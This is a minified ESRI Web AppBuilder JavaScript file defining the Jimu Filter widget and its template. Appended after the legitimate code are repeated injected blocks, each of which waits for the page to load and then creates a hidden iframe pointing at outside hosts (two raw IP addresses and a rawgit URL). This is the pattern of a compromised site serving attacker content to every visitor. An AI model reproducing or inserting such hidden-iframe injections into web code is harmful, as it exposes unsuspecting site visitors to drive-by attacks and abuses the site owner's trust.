// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:jimu/dijit/templates/Filter.html":'\x3cdiv\x3e\r\n\t\x3cdiv data-dojo-attach-point\x3d"contentSection" class\x3d"content-section"\x3e\r\n\t\t\x3cdiv data-dojo-attach-point\x3d"desktopAddSection" class\x3d"desktop-add-section hidden"\x3e\r\n\t\t\t\x3cdiv data-dojo-attach-event\x3d"click:_onBtnAddExpClick" data-dojo-attach-point\x3d"btnAddExpDesktop"\r\n\t\t\t class\x3d"add-with-icon add-expression jimu-float-leading jimu-state-disabled"\x3e\r\n\t\t\t\t\x3cspan class\x3d"jimu-icon jimu-icon-add"\x3e\x3c/span\x3e\r\n\t\t\t\t\x3cspan class\x3d"add-label"\x3e${nls.addAnotherExpression}\x3c/span\x3e\r\n\t\t\t\x3c/div\x3e\r\n\t\t\t\x3cdiv data-dojo-attach-event\x3d"click:_onBtnAddSetClick" data-dojo-attach-point\x3d"btnAddSetDesktop"\r\n\t\t\t class\x3d"add-with-icon add-set jimu-float-leading jimu-state-disabled"\x3e\r\n\t\t\t\t\x3cspan class\x3d"jimu-icon jimu-icon-add"\x3e\x3c/span\x3e\r\n\t\t\t\t\x3cspan class\x3d"add-label"\x3e${nls.addSet}\x3c/span\x3e\r\n\t\t\t\x3c/div\x3e\r\n\t\t\x3c/div\x3e\r\n\t\t\x3cdiv data-dojo-attach-point\x3d"matchMsg" class\x3d"match-msg"\x3e\r\n\t\t\t\x3cspan\x3e${nls.strMatchMsgPart1}\x3c/span\x3e\r\n\t\t\t\x3cselect data-dojo-attach-point\x3d"allAnySelect"\x3e\r\n\t\t\t\t\x3coption value\x3d"AND" selected\x3e${nls.all}\x3c/option\x3e\r\n\t\t\t\t\x3coption value\x3d"OR"\x3e${nls.any}\x3c/option\x3e\r\n\t\t\t\x3c/select\x3e\r\n\t\t\t\x3cspan\x3e${nls.strMatchMsgPart2}\x3c/span\x3e\r\n\t\t\x3c/div\x3e\r\n\t\t\x3cdiv class\x3d"allExpsBox" data-dojo-attach-point\x3d"allExpsBox"\x3e\r\n\t\t\x3c/div\x3e\r\n\t\x3c/div\x3e\r\n\t\x3cdiv data-dojo-attach-point\x3d"errorSection" class\x3d"hidden"\x3e\r\n\t\t\x3cspan class\x3d"jimu-icon jimu-icon-error"\x3e\x3c/span\x3e\r\n\t\t\x3cspan data-dojo-attach-point\x3d"errorTip" class\x3d"error-tip"\x3e\x3c/span\x3e\r\n\t\x3c/div\x3e\r\n\t\x3cdiv data-dojo-attach-point\x3d"mobileAddSection" class\x3d"mobile-add-section hidden"\x3e\r\n\t\t\x3cdiv data-dojo-attach-event\x3d"click:_onBtnAddExpClick" title\x3d"${nls.addAnotherExpression}" class\x3d"jimu-btn jimu-btn-vacation jimu-float-leading jimu-state-disabled" data-dojo-attach-point\x3d"btnAddExpMobile"\x3e\r\n\t\t\t+ ${nls.addAnotherExpression}\r\n\t\t\x3c/div\x3e\r\n\t\t\x3cdiv data-dojo-attach-event\x3d"click:_onBtnAddSetClick" title\x3d"${nls.addSet}" class\x3d"jimu-btn jimu-btn-vacation jimu-float-leading jimu-state-disabled" data-dojo-attach-point\x3d"btnAddSetMobile"\x3e\r\n\t\t\t+ ${nls.addSet}\r\n\t\t\x3c/div\x3e\r\n\t\x3c/div\x3e\r\n\t\x3cdiv data-dojo-attach-point\x3d"noFilterTipSection" class\x3d"no-filter-tip hidden"\x3e\x3c/div\x3e\r\n\t\x3cdiv data-dojo-attach-point\x3d"loading" data-dojo-type\x3d"jimu/dijit/LoadingIndicator" data-dojo-props\x3d"hidden:true"\x3e\x3c/div\x3e\r\n\x3c/div\x3e'}});
define("dojo/on dojo/Evented dojo/_base/declare dijit/_WidgetBase dijit/_TemplatedMixin dijit/_WidgetsInTemplateMixin dojo/text!./templates/Filter.html jimu/filterUtils jimu/utils jimu/LayerInfos/LayerInfos jimu/dijit/_filter/ValueProviderFactory dijit/registry dojo/_base/lang dojo/_base/html dojo/_base/array dojo/aspect dojo/Deferred esri/request ./_SingleFilter ./_FilterSet ./LoadingIndicator".split(" "),function(k,p,q,r,t,u,v,w,x,y,z,A,c,e,f,l,h,m,B,C){return q([r,t,u,w,p],{templateString:v,baseClass:"jimu-filter",
declaredClass:"jimu.dijit.Filter",nls:null,autoSwitchMode:!0,_validOptions:!1,_layerDefinition:null,_def:null,valueProviderFactory:null,featureLayerId:null,layerInfosObj:null,mode:"desktop",noFilterTip:"",enableAskForValues:!1,mobileBreakWidth:600,postMixInProperties:function(){this.nls=window.jimuNls.filterBuilder;var a=this.nls.matchMsg.split("${any_or_all}");this.nls.strMatchMsgPart1=a[0]||"";this.nls.strMatchMsgPart2=a[1]||"";this.nls.add=window.jimuNls.common.add;this.nls.apply=window.jimuNls.common.apply;
this.layerInfosObj=y.getInstanceSync();this.inherited(arguments)},postCreate:function(){this.inherited(arguments);this._setDesktopMode();this.noFilterTip&&"string"===typeof this.noFilterTip&&(this.noFilterTipSection.innerHTML=this.noFilterTip)},startup:function(){this.inherited(arguments);this.autoUpdateMode()},resize:function(){this.autoUpdateMode()},autoUpdateMode:function(){this.autoSwitchMode&&(this._clearMode(),this.domNode.clientWidth>=this.mobileBreakWidth?this._setDesktopMode():this._setMobileMode())},
setMode:function(a){"desktop"===a?this._setDesktopMode():"mobile"===a&&this._setMobileMode()},_setMode:function(a){this.mode=a;this._setModeClass(this.mode)},_setModeClass:function(a){e.removeClass(this.domNode,"desktop-mode");e.removeClass(this.domNode,"mobile-mode");e.addClass(this.desktopAddSection,"hidden");e.addClass(this.mobileAddSection,"hidden");a&&e.addClass(this.domNode,a+"-mode")},_clearMode:function(){this._setModeClass("")},_setDesktopMode:function(){this._setMode("desktop");e.removeClass(this.desktopAddSection,
"hidden")},_setMobileMode:function(){this._setMode("mobile");e.removeClass(this.mobileAddSection,"hidden")},reset:function(){this.isBuilding()||(this.removeAllFilters(),this.url=null,this.isHosted=!1,this.valueProviderFactory=this.partsObj=this.expr=this.featureLayerId=this._layerDefinition=null)},isBuilding:function(){return this._def&&!this._def.isFulfilled()},build:function(a){var b=new h;this.isBuilding()?b.reject("Filter is already building."):(this._def=null,this.reset(),this.url=a.url,this.isHosted=
x.isHostedService(this.url),this._layerDefinition=a.layerDefinition,this.featureLayerId=a.featureLayerId,a.partsObj?(this.partsObj=this._updatePartsObj(a.partsObj),this._def=this._init("partsObj")):(this.expr=a.expr||"1\x3d1",this._def=this._init("expr")),b=this._def);return b},buildByExpr:function(a,b,d){console.warn("Filter#buildByExpr() method is deprecated, please use Filter#build() instead.");return this.build({url:a,expr:b,layerDefinition:d,featureLayerId:this.featureLayerId})},buildByFilterObj:function(a,
b,d){console.warn("Filter#buildByFilterObj() method is deprecated, please use Filter#build() instead.");return this.build({url:a,partsObj:b,layerDefinition:d,featureLayerId:this.featureLayerId})},_updatePartsObj:function(a){f.forEach(a,c.hitch(this,function(a){a.parts?f.forEach(a.parts,c.hitch(this,function(a){a.interactiveObj&&!0===a.interactiveObj.cascade?a.interactiveObj.cascade="previous":!1===a.interactiveObj.cascade&&(a.interactiveObj.cascade="none")})):a.interactiveObj&&!0===a.interactiveObj.cascade?
a.interactiveObj.cascade="previous":!1===a.interactiveObj.cascade&&(a.interactiveObj.cascade="none")}));return a},removeAllFilters:function(){this._destroyAllFilters()},_getLayerDefinitionRaw:function(a,b){var d=new h;b?d.resolve(b):(this.loading.show(),m({url:a,content:{f:"json"},handleAs:"json",callbackParamName:"callback"}).then(c.hitch(this,function(a){this.domNode?(this.loading.hide(),d.resolve(a)):d.reject()}),c.hitch(this,function(a){console.error(a);d.reject();this.domNode&&this.loading.hide()})));
return d},_validateLayerDefinition:function(a){return this._isObject(a)},_init:function(a){var b=new h;if(!this._isString(this.url))return b.reject(),b;var d=c.hitch(this,function(){setTimeout(c.hitch(this,function(){this.emit("change");b.resolve()}),1500)}),n=c.hitch(this,function(){e.addClass(this.errorSection,"hidden");this.removeAllFilters();this.featureLayerId&&this._tryOverrideFieldAliases(this.featureLayerId,this._layerDefinition);var g=this._layerDefinition.fields;g&&0<g.length?(g=f.filter(g,
c.hitch(this,function(a){return 0<=this._supportFieldTypes.indexOf(a.type)})))&&0<g.length?(this._validOptions=!0,e.removeClass(this.btnAddSetDesktop,"jimu-state-disabled"),e.removeClass(this.btnAddExpDesktop,"jimu-state-disabled"),e.removeClass(this.btnAddSetMobile,"jimu-state-disabled"),e.removeClass(this.btnAddExpMobile,"jimu-state-disabled"),this.createFieldsStore(),this.valueProviderFactory=new z({url:this.url,layerDefinition:this._layerDefinition,featureLayerId:this.featureLayerId}),"expr"===
a?this._isString(this.expr)?("1\x3d1"===this.expr.replace(/\s/gi,"")&&this.removeAllFilters(),this._parseExpr(this.expr)?d():b.reject()):b.reject():"partsObj"===a?this._validatePartsObj(this.partsObj)?(this._parsePartsObj(this.partsObj),d()):b.reject():this._validatePartsObj(this.partsObj)?(this._parsePartsObj(this.partsObj),d()):this._isString(this.expr)?this._parseExpr(this.expr)?d():b.reject():(this.removeAllFilters(),d())):(this._showErrorOptions(this.nls.error.noFilterFields),b.reject()):b.reject()});
this._validateLayerDefinition(this._layerDefinition)?n():(this.loading.show(),m({url:this.url,content:{f:"json"},handleAs:"json",callbackParamName:"callback"}).then(c.hitch(this,function(a){this.domNode?(this.loading.hide(),this._layerDefinition=a,n()):b.reject()}),c.hitch(this,function(a){console.error(a);b.reject();this.domNode&&this.loading.hide()})));return b},_tryOverrideFieldAliases:function(a,b){if(a=this.layerInfosObj.getLayerOrTableInfoById(a))if(a=a.getPopupInfo())if(a=a.fieldInfos,b=b.fields,
a&&0<a.length&&b&&0<b.length){var d={};f.forEach(a,c.hitch(this,function(a){a.fieldName&&(d[a.fieldName]=a)}));f.forEach(b,c.hitch(this,function(a){var b=d[a.name];b&&b.label&&(a.alias=b.label)}))}},toJson:function(){var a={logicalOperator:this.allAnySelect.value,parts:[]},b=this._getAllSingleFiltersAndFilterSets();if(0===b.length)return a.expr="1\x3d1",a;f.forEach(b,c.hitch(this,function(b){b=b.toJson();a.parts.push(b)}));return f.every(a.parts,c.hitch(this,function(a){return!!a}))&&0<a.parts.length?
(a.expr=this.getExprByFilterObj(a),a):null},createFieldsStore:function(){if(this._layerDefinition.fields&&0!==this._layerDefinition.fields.length){var a=c.clone(this._layerDefinition).fields;0===this.setFieldsStoreByFieldInfos(a)&&this._showErrorOptions(this.nls.error.noFilterFields)}else this._showErrorOptions(this.nls.error.noFilterFields)},_parsePartsObj:function(a){this._validatePartsObj(a)&&(this.removeAllFilters(),this._buildEditUIByPartsObj(a))},_parseExpr:function(a){this._destroyAllFilters();
var b=null;if(!this._validateLayerDefinition(this._layerDefinition))return b;if(!a||"string"!==typeof a)return this._showErrorOptions(this.nls.error.invalidSQL),b;if("1\x3d1"===this.expr.replace(/\s/gi,""))return b={expr:"1\x3d1",parts:[],logicalOperator:"AND"};try{b=this.getFilterObjByExpr(a)}catch(d){b=null,console.error(d)}b?this._buildEditUIByPartsObj(b):this._showErrorOptions(this.nls.error.cantParseSQL);return b},_buildEditUIByPartsObj:function(a){a&&(this._destroyAllFilters(),this.allAnySelect.value=
a.logicalOperator,f.forEach(a.parts,c.hitch(this,function(a){a.parts?this._addFilterSet(a):a.fieldObj&&a.operator&&a.valueObj&&this._addSingleFilter(a)})))},_addSingleFilter:function(a){a={url:this.url,layerInfo:this._layerDefinition,stringFieldType:this._stringFieldType,dateFieldType:this._dateFieldType,numberFieldTypes:this._numberFieldTypes,part:a,OPERATORS:c.mixin({},this.OPERATORS),enableAskForValues:this.enableAskForValues,isHosted:this.isHosted,valueProviderFactory:this.valueProviderFactory};
a=new B(a);a.placeAt(this.allExpsBox);a.startup();this.own(l.after(a,"_destroySelf",c.hitch(this,function(){this._checkFilterNumbers();this.emit("change")})));this.own(k(a,"change",c.hitch(this,function(){this.emit("change")})));this._checkFilterNumbers();return a},_addFilterSet:function(a){a={url:this.url,layerInfo:this._layerDefinition,stringFieldType:this._stringFieldType,dateFieldType:this._dateFieldType,numberFieldTypes:this._numberFieldTypes,partsObj:a,OPERATORS:c.mixin({},this.OPERATORS),enableAskForValues:this.enableAskForValues,
isHosted:this.isHosted,valueProviderFactory:this.valueProviderFactory};a=new C(a);a.placeAt(this.allExpsBox);a.startup();this.own(l.after(a,"_destroySelf",c.hitch(this,function(){this._checkFilterNumbers();this.emit("change")})));this.own(k(a,"change",c.hitch(this,function(){this.emit("change")})));this._checkFilterNumbers();return a},_destroyAllFilters:function(){for(var a=this._getAllSingleFiltersAndFilterSets();0<a.length;)a[0].destroy(),a.splice(0,1);this._checkFilterNumbers()},_getAllSingleFiltersAndFilterSetsDoms:function(){var a=
[];this.allExpsBox.childNodes&&0<this.allExpsBox.childNodes.length&&f.forEach(this.allExpsBox.childNodes,c.hitch(this,function(b){(e.hasClass(b,"jimu-single-filter")||e.hasClass(b,"jimu-filter-set"))&&a.push(b)}));return a},_getAllSingleFiltersAndFilterSets:function(){var a=this._getAllSingleFiltersAndFilterSetsDoms();return f.map(a,c.hitch(this,function(a){return A.byNode(a)}))},_checkFilterNumbers:function(){0<this._getAllSingleFiltersAndFilterSetsDoms().length?e.addClass(this.noFilterTipSection,
"hidden"):e.removeClass(this.noFilterTipSection,"hidden");this.emit("filter-number-change")},_showErrorOptions:function(a){console.error(a);e.addClass(this.errorSection,"hidden");this.errorTip.innerHTML=a;this.loading.hide()},_onBtnApplyClicked:function(){this.emit("apply")},_onBtnAddSetClick:function(){this._layerDefinition&&this._validOptions&&(this._addFilterSet(),this.emit("change"))},_onBtnAddExpClick:function(){this._layerDefinition&&this._validOptions&&(this._addSingleFilter(),this.emit("change"))}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});